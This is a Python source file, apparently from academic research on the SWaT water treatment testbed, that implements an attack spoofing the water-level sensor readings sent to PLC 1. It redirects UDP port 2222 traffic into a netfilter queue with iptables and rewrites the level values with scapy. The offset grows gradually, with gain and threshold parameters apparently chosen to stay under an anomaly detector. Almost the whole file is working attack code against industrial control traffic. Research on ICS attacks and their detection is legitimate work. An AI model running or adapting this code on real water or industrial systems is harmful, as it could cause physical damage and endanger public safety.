#!/usr/bin/env python2
# -*- coding: utf-8 -*-
# Copyright (c) 2015 David I. Urbina, UTD
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in
# all copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
# THE SOFTWARE.
"""Secure Water Testbed (SWaT) Singapore University of Technology and Design.
SWATAttack module to spoof water level in PLC 1.
"""
from __future__ import print_function
from netfilterqueue import NetfilterQueue
import os
import threading
import time

from scapy.layers.inet import IP
from scapy.layers.inet import UDP

import swat
import filters
import scaling


class RepeatEvery(threading.Thread):
    def __init__(self, interval, func, *args, **kwargs):
        threading.Thread.__init__(self)
        self.interval = interval  # seconds between calls
        self.func = func  # function to call
        self.args = args  # optional positional argument(s) for call
        self.kwargs = kwargs  # optional keyword argument(s) for call
        self.runable = True

    def run(self):
        time.sleep(5)
        while self.runable:
            self.func(*self.args, **self.kwargs)
            time.sleep(self.interval)

    def stop(self):
        self.runable = False


# Parameters list
T = 0.05
L = 0.1
max_attack = 0
multip = 1
slope_sign = True


def update_attack_level():
    global max_attack, multip
    max_attack = multip * L * T * 1000
    multip += 1


def __spoof(packet):
    pkt = IP(packet.get_payload())
    if swat.SWAT_P1_RIO_AI in pkt:
        slevel = filters.scale(pkt[swat.SWAT_P1_RIO_AI].level, scaling.P1Level)
        slevel += max_attack if slope_sign else -max_attack
        level = filters.reverse_scale(slevel, scaling.P1Level)
        pkt[swat.SWAT_P1_RIO_AI].level = level
        del pkt[UDP].chksum  # Need to recompute checksum
        packet.set_payload(str(pkt))

    packet.accept()


def start():
    __setup()
    nfqueue = NetfilterQueue()
    nfqueue.bind(0, __spoof)
    thread = RepeatEvery(1, update_attack_level)
    try:
        print("[*] starting water level spoofing")
        thread.start()
        nfqueue.run()
    except KeyboardInterrupt:
        __setdown()
        thread.stop()
        thread.join()
        nfqueue.unbind()
        print("[*] stopping water level spoofing")


def configure():
    global  L, T, slope_sign
    L = input('Set Estimation Gain (L): ')
    T = input('Set Detection Threshold (T): ')
    slope_sign = input('Set slope sign Increasing(1) Decreasing(0): ')
    params()


def params():
    slope = 'Increasing' if slope_sign else 'Decreasing'
    print('Slope: {} L: {} T: {}'.format(slope, L, T))


def __setup():
    global max_attack, multip
    max_attack, multip = 0, 1
    os.system('sudo iptables -t mangle -A PREROUTING -p udp --dport 2222 -j NFQUEUE')


def __setdown():
    os.system('sudo iptables -t mangle -D PREROUTING -p udp --dport 2222 -j NFQUEUE')
